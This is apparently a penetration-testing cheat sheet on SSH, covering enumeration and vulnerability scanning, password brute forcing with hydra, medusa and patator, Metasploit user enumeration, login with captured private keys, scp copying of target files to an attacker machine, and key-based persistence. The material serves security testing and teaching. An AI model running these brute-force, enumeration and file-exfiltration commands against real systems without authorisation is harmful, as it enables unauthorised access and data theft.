



# SSH Enumeration
1. Banner grabbing
  - echo | nc <TARGET> <PORT>
  - nmap -p <PORT> <TARGET>
  - nmap -sV -p <PORT> <TARGET>
  - nmap -sV -A -p <PORT> <TARGET>
2. SSH Authentication Methods
  - ssh username@<TARGET> -p <PORT>
  - ssh -v username@<TARGET> -p <PORT> PreferredAuthentications=password
  - nmap -p <PORT> --script ssh-auth-methods <TARGET>
3. Algorithm Detection
  - nmap -p <PORT> -sV --script=sshv1,ssh2-enum-algos <TARGET>
4. Vulnerability Scan
  - nmap -sV -p <PORT> --script vuln <TARGET>
5. Audit SSH
  - ssh-audit <TARGET>:<PORT>
6. CSVs Search
  - searchsploit <SSH_VERSION>
7. Enumerate users (if supported)
  - msfconsole -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <TARGET>; set RPORT <PORT>; run"


## SSH Engage
1. SSH Brute Forcing IF Supported password authentication method
  - nmap -sV -p <PORT> --script ssh-brute <TARGET>
  - hydra -l <USERNAME> -P <PASSFILE> -t <THREADS> -fv ssh://<TARGET>
  - medusa -h <TARGET> -u <USERNAME> -P <PASSFILE> -t <THREADS> -M ssh
  - patator ssh_login host=<TARGET> user=<USERNAME> password=FILE0 0=<PASSFILE> -x ignore:fgrep='Authentication failed.'
2. Test SSH login with a known private key (if available)
  - ssh -i private_key root@<TARGET> -p <PORT> -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 2>&1
3. Exploit CVEs
4. Test for keystroke timing attacks

## SSH techniques
1. SSH to TARGET
  - ssh -p <PORT> <TARGET-USERNAME>@<IP-ADDRESS> PreferredAuthentications=password
  - ssh -p <PORT> -i id_rsa <TARGET-USERNAME>@<IP-ADDRESS>
2. SSH File Transferring
  - scp <FILE-TO-SEND> <TARGET-USERNAME>@<TARGET-IP>:<TARGET-DESTINATION-DIRECTORY>
  - scp <TARGET-USERNAME>@<TARGET-IP>:<FILE-TO-SEND-TO-ATTACKER> <ATTACKER-DESTINATION-DIRECTORY>
3. Mounting a remote filesystem using SSHFS
  - sshfs <TARGET-USERNAME>@<TARGET-IP>:<FILESYSTEM-TO-MOUNT> <MOUNTPOINT>
4. SSH Persistence
  - ssh-keygen -t rsa -b 4096 -N '' -f id_rsa
  - chmod +r id_rsa
5. Bonus
  - cat id_rsa | grep -v "OPENSSH PRIVATE KEY" | base64 -d | xxd


CVE-2016–6210
CVE-2018–15473
https://www.ssh-audit.com/hardening_guides.html
https://olivierkonate.medium.com/ssh-pentesting-c68c9f5c3000
